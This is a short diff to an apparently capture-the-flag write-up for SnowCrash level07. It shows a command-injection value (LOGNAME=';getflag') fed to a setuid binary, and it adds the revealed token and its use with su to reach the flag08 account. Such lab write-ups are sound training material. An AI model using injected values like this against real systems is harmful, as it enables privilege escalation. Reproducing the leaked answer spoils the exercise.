@@ -37,6 +37,12 @@ level07
 level07@SnowCrash:~$ export LOGNAME=";getflag"
 level07@SnowCrash:~$ ./level07
 
-Check flag.Here is your token : <hidden>
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+```
+now you can switch to the flag08
+```bash
+level07@SnowCrash:~$ su flag08 fiumuikeil55xe9cu4dood66h
+level07@SnowCrash:~$ getflag
+<hidden>
 ```
 tadammm
